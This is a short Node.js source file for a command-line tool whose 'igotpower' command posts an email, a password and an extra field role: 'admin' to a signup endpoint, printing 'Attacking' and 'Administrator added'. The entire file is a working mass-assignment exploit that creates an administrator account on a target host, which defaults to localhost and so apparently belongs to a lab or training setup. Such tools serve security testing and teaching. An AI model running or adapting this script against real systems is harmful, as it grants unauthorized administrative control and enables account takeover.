const axios = require('axios');
const fs = require('fs');
const ProgressBar = require('progress');

const Command = require('./command');

class IGotPower extends Command {
  constructor() {
    super(
      'igotpower',
      'Creates an admin user',
      [
        [ '<email>', 'The email address to register as an admin user'],
        [ '<password>', 'The password']
      ],
      [
        [ '-h', '--host <host>', 'The hostname for the API endpoint. Default is localhost.'],
        [ '-p', '--port <port>', 'The port for the API endpoint. Default is 3333.'],
        [ '-s', '--https', 'Use https for the connection.']
      ]
    );
  }

  async action(email, password, options) {
    const host = options.host ? options.host : 'localhost';
    const port = options.port ? options.port : '3333';
    const protocol = options.https ? 'https' : 'http'
    const url = `${protocol}://${host}:${port}/auth/signup`;

    console.log(`Attacking ${url}`);

    await axios.post(
      url, 
      { email, password, role: 'admin' }
    ).then(() => console.log(`Administrator added`))
    .catch((err) => console.log(err));
  }
}

module.exports = IGotPower;